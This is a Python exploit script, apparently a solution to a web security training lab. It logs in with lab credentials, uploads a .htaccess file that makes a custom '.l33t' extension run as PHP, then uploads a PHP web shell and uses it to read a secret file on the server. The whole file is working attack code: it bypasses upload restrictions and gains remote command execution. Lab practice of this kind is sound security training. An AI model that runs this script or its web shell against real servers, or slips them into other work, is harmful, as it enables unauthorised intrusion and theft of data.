import requests
import sys
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter, Retry


def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token

def login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)

    login_data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }

    login_response = session.post(f"{url}/login", data=login_data, timeout=10)
    return login_response.status_code == 200


def upload_file(url, session):
    response = session.get(f"{url}/my-account")
    csrf_token = extract_csrf_token(response)

    htaccess_file = {
        "avatar": (".htaccess", "AddType application/x-httpd-php .l33t", "text/plain"),
    }

    web_shell_file = {
        "avatar": ("webshell.l33t", "<?php system($_GET['cmd']); ?>", "application/x-php"),
    }

    data = {
        "user": "wiener",
        "csrf": csrf_token,
    }

    htaccess_file_upload = session.post(f"{url}/my-account/avatar", files=htaccess_file, data=data)
    web_shell_upload = session.post(f"{url}/my-account/avatar", files=web_shell_file, data=data)
    return htaccess_file_upload.status_code == 200 and web_shell_upload.status_code == 200


def execute_command(url, session):
    response = session.get(f"{url}/files/avatars/webshell.l33t?cmd=cat%20/home/carlos/secret", timeout=10)
    return response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in...")
        if not login(url, session):
            print("Something went wrong. Check your URL and try again.")
            sys.exit(1)

        print("(+) Uploading webshell...")
        if upload_file(url, session):
            print(f"(+) Web shell has been uploaded here: {url}/files/avatars/webshell.l33t")
            secret_file = execute_command(url, session)
            print(f"(+) The contents of the /home/carlos/secret file: {secret_file}")
        else:
            print("(-) File Upload was unsuccessful.")

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


if __name__ == "__main__":
    main()
